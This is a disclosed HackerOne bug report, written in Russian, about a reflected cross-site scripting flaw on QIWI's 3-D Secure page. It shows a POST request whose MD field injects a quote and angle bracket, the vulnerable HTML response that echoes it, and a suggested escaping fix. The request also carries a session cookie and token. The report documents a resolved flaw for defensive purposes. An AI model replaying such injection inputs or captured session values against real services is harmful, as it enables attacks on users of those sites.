---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '198249'
original_report_id: '198249'
title: '[XSS/3dsecure.qiwi.com] 3DSecure XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2017-01-13T23:05:52.388Z'
disclosed_at: '2017-03-10T20:23:51.079Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [XSS/3dsecure.qiwi.com] 3DSecure XSS

## Metadata

- HackerOne Report ID: 198249
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2017-03-10T20:23:51.079Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

При отправке POST запроса:
```
POST https://3dsecure.qiwi.com/acs/pareq?network=VISA HTTP/1.1
Host: 3dsecure.qiwi.com
Connection: keep-alive
Content-Length: 37
Cache-Control: max-age=0
Origin: https://pay.qiwi.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://pay.qiwi.com/?token=7809dc86-f077-4931-a7e7-628c38c16150
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: JSESSIONID=XRCZ-Xhl9Qsb6oP-TOrUQ-F2jU-p3MsYGz5OGdQjrvX2PFRYUiNE!-242627973

PaReq=test&MD=test%22%3E&TermUrl=test
```

Сервер возвращает 
```
<html>

<head>
    <script>
        function onLoadFunction() {
            document.data.submit();
        }
    </script>
</head>

<body onLoad="onLoadFunction()">
    <form name="data" method="POST" action="test">
    <input type="hidden" name="MD" value="test">">
    <input type="hidden" name="PaRes" value="eJxVj0sLwjAQhP/KkruNiqCFbURsqwcF8XHwWM2qgTahSX39e6tNFS8LyzczO4vjR5HDjaxTRkesF3QZkD4aqfQ5Yrtt2hmxscDtxRLFGzpeLQlcknPZmUDJiMVhXsp7lvb2w/lkFg6m6/ViWSYpE5hYa6xAHy7q7KCPvF2R3nhqJIkwRP7bGuBviBXZItOkK3BPV1EBp0zldYvAW1pd44qpqrFI60ESKgOHq8olfBgUjbR1ei1y35N/o/jfuy9UbWWC"></form>
</body>

</html>
```

Как мы видим `<input type="hidden" name="MD" value="test">">` являет собой пассивную XSS через POST запрос.

Советы по исправлению: Сделать escape `"` на `&quot;` символ

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
